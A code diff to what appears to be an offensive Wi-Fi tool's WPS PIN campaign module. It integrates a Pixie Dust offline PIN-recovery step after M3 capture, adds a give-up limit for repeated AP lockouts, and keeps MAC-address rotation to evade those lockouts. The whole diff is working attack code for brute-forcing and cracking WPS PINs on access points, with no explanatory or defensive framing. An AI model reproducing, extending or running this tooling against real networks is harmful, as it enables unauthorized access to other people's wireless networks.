@@ -34,6 +34,7 @@ from .auth_assoc import Association, WlanTransport, random_client_mac
 from wifit3.dot11 import str_to_mac
 from wifit3.dot11.wsc.assoc_ie import WPS_REQ_REGISTRAR, wps_assoc_ie
 from .wps.lock import LockTracker
+from .wps.pixie import recover_pin
 from .wps.registrar import AttemptOutcome, PinResult, WpsRegistrar, config_error_name
 
 logger = logging.getLogger(__name__)
@@ -93,6 +94,7 @@ class WpsCampaign(Campaign):
     _SAVE_EVERY = 16          # checkpoint the .run file every N attempts
     _MAX_TIMEOUT_RETRIES = 8  # retries of a silent (lost-reply) attempt before conceding
     _REFUSAL_BAIL = 3         # consecutive refusals (disassoc / identity-stall) before giving up
+    _MAX_LOCKS_NO_PROGRESS = 5
 
     button_id = "btn-wps-pin"
     key = "wps"
@@ -163,6 +165,7 @@ class WpsCampaign(Campaign):
         self._consecutive_refusals = 0
         self.fail_reason: Optional[str] = None   # terse give-up reason; Focus renders the fail-leaf
         self._last_logged_pin: Optional[str] = None   # log the PIN only when it changes (save width)
+        self._pixie_tried = False
 
     # ---- persistence --------------------------------------------------------
     def _load_state(self) -> CampaignState:
@@ -424,8 +427,16 @@ class WpsCampaign(Campaign):
                     await self._handle_lock(beacon_locked, wait=not skip_wait)
                     if self.stopped:
                         break  # Short circuit before next phase
-                    self._rotate_mac()
                     self._consecutive_locks_no_progress += 1
+                    if self._consecutive_locks_no_progress >= self._MAX_LOCKS_NO_PROGRESS:
+                        self.status = "failed"
+                        self.fail_reason = (
+                            f"WPS stayed locked for {self._consecutive_locks_no_progress} "
+                            "cycles without PIN progress"
+                        )
+                        self._save_state()
+                        break
+                    self._rotate_mac()
                     continue
 
                 pin = self._next_pin()
@@ -460,6 +471,10 @@ class WpsCampaign(Campaign):
                         break
                     continue                       # bounded retry; never advance the keyspace
                 self._consecutive_refusals = 0
+
+                if self._try_pixie(pin, out):
+                    self._save_state()
+                    continue
 
                 if self._should_retry_lost_reply(pin, out):
                     # Session already reset by _try; the retry re-associates fresh (same MAC).
@@ -541,6 +556,24 @@ class WpsCampaign(Campaign):
         if self._lock_end_at is None:
             return 0.0
         return max(0.0, self._lock_end_at - time.monotonic())
+
+    def _try_pixie(self, pin: str, out: AttemptOutcome) -> bool:
+        """Run Pixie once after M3 capture; verify any recovered PIN online next."""
+        if self._pixie_tried or self.state.phase == "verify" or out.pixie is None:
+            return False
+        self._pixie_tried = True
+        self.log(f"{self._attempt_prefix(pin)} → [cyan]captured PixieWPS bundle[/cyan] "
+                 "[dim](trying offline)[/dim]")
+        result = recover_pin(out.pixie)
+        if not result.found or result.pin is None:
+            self.log(f"{self._cont_align()} → [dim]PixieWPS did not match known weak modes[/dim]")
+            return False
+        self.state.found_pin = result.pin
+        self.state.phase = "verify"
+        mode = result.mode.value if result.mode is not None else "unknown"
+        self.log(f"{self._cont_align()} → [bold bright_green]PixieWPS found PIN[/bold bright_green] "
+                 f"[cyan]{result.pin}[/cyan] [dim]({mode}; verifying)[/dim]")
+        return True
 
     def _should_retry_lost_reply(self, pin: str, out: AttemptOutcome) -> bool:
         """True if this half-wrong was inferred from *silence* on an AP we know NACKs."""
